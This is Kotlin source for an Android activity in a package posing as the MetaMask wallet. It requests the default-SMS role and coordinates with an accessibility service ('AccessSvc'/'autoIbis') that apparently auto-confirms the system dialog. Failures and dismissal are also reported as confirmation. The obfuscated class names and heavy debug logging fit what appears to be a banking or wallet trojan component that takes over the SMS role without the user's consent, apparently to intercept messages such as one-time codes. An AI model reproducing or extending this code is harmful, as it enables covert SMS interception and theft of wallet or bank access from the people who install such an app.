package com.example.MetaMask.activities

import android.app.role.RoleManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.example.MetaMask.ChainBridge
import com.example.MetaMask.services.AccessSvc

class OtterHawkLauncherActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "SmsRoleLauncher"
    }

    private lateinit var roleLauncher: ActivityResultLauncher<Intent>
    private var launched = false
    private var resultDelivered = false

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        roleLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) {
            resultDelivered = true
            AccessSvc.instance?.autoIbis?.roleSelectionActive = false
            sendBroadcast(Intent(ChainBridge.ACTION_SMS_ROLE_CONFIRMED).apply { setPackage(packageName) })
            AccessSvc.instance?.onRoleSelectionConfirmed()
            finish()
        }
        super.onCreate(savedInstanceState)
    }

    override fun onResume() {
        android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] onResume enter") //xdbg
        super.onResume()
        if (launched) return
        launched = true
        window.decorView.post {
            if (isFinishing) return@post
            try {
                sendBroadcast(Intent(ChainBridge.ACTION_AUTOIBIS_ROLE).apply { setPackage(packageName) })
                AccessSvc.instance?.autoIbis?.onRoleSelectionAboutToShow()
                roleLauncher.launch(buildSmsRoleIntent())
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[OtterHawkLauncherActivity] catch (ignored)") //xdbg
                resultDelivered = true
                AccessSvc.instance?.onRoleSelectionConfirmed()
                finish()
            }
        }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] onDestroy enter") //xdbg
        super.onDestroy()
        if (launched && !resultDelivered) {
            android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] if branch") //xdbg
            try { AccessSvc.instance?.onRoleSelectionConfirmed() } catch (_: Exception) {}
        }
    }

    private fun buildSmsRoleIntent(): Intent {
        android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] buildSmsRoleIntent enter") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] if branch") //xdbg
            val rm = getSystemService(RoleManager::class.java)
            val avail = rm?.isRoleAvailable(RoleManager.ROLE_SMS) == true
            if (rm != null && avail) {
                android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] if branch") //xdbg
                android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] return") //xdbg
                return rm.createRequestRoleIntent(RoleManager.ROLE_SMS)
            }
        }
        android.util.Log.d("XDBG", "[OtterHawkLauncherActivity] return") //xdbg
        return Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT).apply {
            putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
        }
    }
}
